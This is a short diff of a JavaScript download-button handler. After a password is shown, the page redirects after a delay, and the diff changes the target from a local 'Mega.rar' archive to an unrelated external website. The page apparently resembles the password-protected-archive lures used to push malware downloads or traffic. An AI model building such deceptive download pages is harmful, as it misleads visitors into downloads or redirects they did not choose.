@@ -19,7 +19,7 @@ downloadBtn.addEventListener("click", function(e) {
   
   // Add download start after viewing password
   setTimeout(() => {
-    window.location.href = "/files/Mega.rar";
+    window.location.href = "https://lencart.fr/";
   }, 1500);
 });
 
